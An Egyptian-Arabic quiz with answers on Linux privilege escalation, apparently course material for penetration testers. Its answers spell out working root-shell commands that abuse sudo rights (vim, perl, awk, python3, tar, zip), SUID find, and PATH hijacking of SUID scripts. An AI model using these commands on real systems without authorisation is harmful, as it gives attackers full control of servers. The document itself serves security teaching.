# **أسئلة إكمال الفراغات**
##### 1. أمر `sudo -l` بيوريك قايمة بالأوامر اللي تقدر تشغلها بصلاحيات ______.  
   **root**

##### 2. لو لقيت `vim` في قايمة `sudo -l`، تقدر تستخدم ______ عشان تفتح Shell.  
   **!sh**

##### 3. ملفات SUID بتشتغل بصلاحيات ______ بتاعها.  
   **صاحبها**

##### 4. أمر ______ بيدور على ملفات SUID في لينكس.  
   **find / -perm -4000**

##### 5. لو ملف SUID بيستدعي أمر زي `ls`، تقدر تعدل الـ ______ عشان تاخد Shell.  
   **PATH**

---

# **أسئلة صح وغلط**
##### 6. ال`sudo -l` بيطلب كلمة مرور دايمًا عشان يشتغل. (صح/غلط)  
   **غلط** - لو الصلاحيات مفتوحة بدون باسورد، بيشتغل مباشرة.

##### 7. لو لقيت `find` بـ SUID، تقدر تستخدمه عشان تفتح Shell بصلاحيات root. (صح/غلط)  
   **صح**

##### 8. استغلال SUID ما بينفعش لو الملف مش بيشغل أوامر خارجية. (صح/غلط)  
   **غلط** - بعض الملفات زي `find` بتستغل مباشرة.

##### 9. ال`sudo vim -c '!sh'` بيفتح Shell عادي بدون صلاحيات root. (صح/غلط)  
   **غلط** - بيفتح Shell بصلاحيات root لو `vim` في `sudo -l`.

##### 10. لازم تستخدم GTFOBins عشان تستغل كل أوامر `sudo`. (صح/غلط)  
    **غلط** - مفيد بس مش لازم، تقدر تستغل يدويًا.

---

# **أسئلة اختيار من متعدد**
11. إيه الأمر اللي بيوريك الأوامر المسموحة بـ `sudo`؟  
    أ) `sudo -v`  
    ب) `sudo -l`  
    ج) `find -sudo`  
    د) `chmod -l`  
    **ب) `sudo -l`**

12. إيه الأداة اللي بتساعدك تبحث عن استغلال أوامر SUID أو sudo؟  
    أ) Nmap  
    ب) GTFOBins  
    ج) Burp Suite  
    د) curl  
    **ب) GTFOBins**

13. إيه اللي ممكن تستغله لو لقيت `python3` في قايمة `sudo -l`؟  
    أ) فتح Shell  
    ب) تعديل ملفات  
    ج) تنزيل كود  
    د) كل اللي فوق  
    **أ) فتح Shell**

14. إيه اللي بيخلّي ملف SUID خطير؟  
    أ) بيشتغل بصلاحيات المالك  
    ب) بيمنع التنفيذ  
    ج) بيحتاج باسورد  
    د) بيغلق الوصول  
    **أ) بيشتغل بصلاحيات المالك**

15. إيه الأمر اللي بيفتح Shell من `find` بـ SUID؟  
    أ) `find . -exec /bin/bash -p \;`  
    ب) `find -l`  
    ج) `find / -perm -4000`  
    د) `find -sh`  
    **أ) `find . -exec /bin/bash -p \;`**

---

# **أسئلة "لماذا" لتفسير المفاهيم**
16. ليه استغلال `sudo` بيعتبر مدخل للـ Privilege Escalation؟  
    **لأنه بيسمحلك تشغل أوامر بصلاحيات root لو كانت متاحة بدون باسورد.**

17. ليه `sudo vim -c '!sh'` بيديك Shell بصلاحيات root؟  
    **لأن `vim` لما يشتغل بـ `sudo` بيسمحلك تنفذ أوامر خارجية زي `sh` بصلاحيات عالية.**

18. ليه ملفات SUID بتكون خطيرة في النظام؟  
    **لأنها بتشتغل بصلاحيات المالك (غالبًا root)، فتقدر تستغلها تاخد وصول كامل.**

19. ليه الـ Pentester بيستخدم `find / -perm -4000`؟  
    **عشان يلاقي ملفات SUID اللي ممكن يستغلها لتصعيد الصلاحيات.**

20. ليه تعديل الـ PATH بيساعد في استغلال SUID؟  
    **لأنك بتخلي الملف يشغل أمر انت كتبته بدل الأمر الأصلي، وتاخد Shell.**

---

# **أسئلة ربط المفاهيم ببعضها**
21. إزاي تربط بين `sudo -l` واستغلال أوامر زي `python3`؟  
    **`sudo -l` بيوريك الأوامر المسموحة، و`python3` لو موجود تقدر تستخدمه تفتح Shell.**

22. إيه العلاقة بين ملفات SUID وتصعيد الصلاحيات؟  
    **SUID بتخلي الملف يشتغل بصلاحيات root، فتستغله تاخد وصول أعلى.**

23. إزاي استغلال `find` بـ SUID بيساعدك تفتح Shell؟  
    **لأن `find` بيسمح بتنفيذ أوامر خارجية زي `/bin/bash` بصلاحيات المالك.**

24. إزاي تعديل الـ PATH بيرتبط بملف SUID؟  
    **بتغير مسار الأوامر اللي الملف بيستدعيها، فتشغل Shell بدل الأمر الأصلي.**

25. إيه الرابط بين GTFOBins واستغلال `sudo` وSUID؟  
    **GTFOBins بيديك طرق استغلال للأوامر اللي تلاقيها في `sudo -l` أو SUID.**

---

# **أسئلة للفهم (عميقة من سيناريوهات واقعية لـ Web Pentesting)**
26. لو كنت بتختبر موقع تسوق وشغلت `sudo -l` ولقيت `perl` متاح، إزاي تستغله؟  
    **بتشغل `sudo perl -e 'exec "/bin/sh";'` وتاخد Shell بصلاحيات root.**

27. تخيل إنك بتختبر سيرفر بنك ولقيت `find` بـ SUID، إيه خطتك كـ Pentester؟  
    **بتستخدم `/usr/bin/find . -exec /bin/bash -p \;` عشان تفتح Shell كـ root وتبلغ الخطر.**

28. لو كنت بتختبر منصة تعليمية وشفت `sudo -l` فيه `awk`، إزاي تثبت وجود ثغرة؟  
    **بتشغل `sudo awk 'BEGIN {system("/bin/sh")}'`، تاخد Shell، وتوري إنك وصلت root.**

29. لو سيرفر حكومي لقيت فيه ملف SUID زي `/usr/bin/vim`، إزاي تستغله؟  
    **بتشغل `/usr/bin/vim -c '!sh'`، تفتح Shell كـ root، وتبلغ الضعف.**

30. تخيل إنك بتختبر شركة شحن ولقيت `sudo -l` بيسمح بـ `python3`، إيه اللي هتعمله؟  
    **بتشغل `sudo python3 -c 'import pty; pty.spawn("/bin/bash")'` وتتحكم في السيرفر.**

31. لو كنت بتختبر تطبيق طبي ولقيت ملف SUID زي `/custom_script` بيستدعي `ls`، إزاي تتصرف؟  
    **بتعمل `echo "/bin/sh" > ls`، تعدل الـ PATH، تشغل الملف، وتاخد Shell كـ root.**

32. لو سيرفر دفع أونلاين لقيت `sudo -l` فيه `tar`، إزاي تستغله كـ Web Pentester؟  
    **بتشغل `sudo tar -cf /dev/null / --checkpoint=1 --checkpoint-action=exec=/bin/sh` وتاخد Shell.**

33. تخيل إنك بتختبر موقع سفر ولقيت `/usr/bin/find` بـ SUID، إزاي تثبت خطورته؟  
    **بتشغل `/usr/bin/find . -exec /bin/bash -p \;`، تفتح Shell، وتوري إنك وصلت root.**

34. لو كنت بتختبر منصة عقارية ولقيت `sudo -l` بيسمح بـ `zip`، إيه خطوتك؟  
    **بتشغل `sudo zip /tmp/test.zip /tmp/test -T --unzip-command="/bin/sh"` وتاخد Shell.**

35. لو سيرفر بيع تذاكر لقيت ملف SUID زي `/backup` بيستدعي `cat`، إزاي تستفيد؟  
    **بتعمل `echo "/bin/sh" > cat`، تعدل الـ PATH، تشغل `/backup`، وتاخد Shell كـ root.**

---

# **أسئلة كتابة كود**
#### 36. اكتب أمر عشان تشوف الأوامر المسموحة بـ `sudo`.  
    sudo -l

#### 37. اكتب أمر عشان تستغل `vim` في `sudo` تفتح Shell.  
    sudo vim -c '!sh'

#### 38. اكتب أمر عشان تبحث عن ملفات SUID في النظام.  
    find / -perm -4000 2>/dev/null

#### 39. اكتب أمر عشان تستغل `find` بـ SUID تفتح Shell.  
    /usr/bin/find . -exec /bin/bash -p \;

#### 40. اكتب أوامر عشان تعدل الـ PATH وتستغل ملف SUID بيستدعي `ls`.  
    echo "/bin/sh" > ls  
    chmod +x ls  
    export PATH=.:$PATH  
    /custom_script

---

# **أسئلة الخلاصة**
41. قولي الخلاصة بتاعت الجزء الأول ("استغلال أوامر sudo (Abusing Sudo Privileges)").  
    **"لو تقدر تشغل أوامر معينة بـ `sudo`، دور على أمر ممكن يفتح لك Shell بصلاحيات root. استخدم `sudo -l` وشوف لو فيه حاجة تقدر تستغلها."**

42. قولي الخلاصة بتاعت الجزء التاني ("استغلال ملفات SUID (Abusing SUID Binaries)").  
    **"لو فيه ملف عليه SUID، جرب تشوف بيعمل إيه، ولو بيشغل أوامر، ممكن تخليه يشغل Shell بصلاحيات root."**

43. قولي الخلاصة بتاعت الجزء التالت ("خطوات Pentesting عملية لاستغلال sudo و SUID").  
    **"1. `sudo -l` ده أول حاجة تشوفها، لو تقدر تشغل حاجة بـ sudo بدون باسورد، غالبًا تقدر توصل لـ root. 2. لو لقيت SUID file، شوف بيعمل إيه، وجرب تشغله بطرق مختلفة. 3. لو ملف بيستدعي أوامر خارجية، حاول تلعب في الـ PATH وتخليه يشغل حاجة انت عاملها بنفسك."**

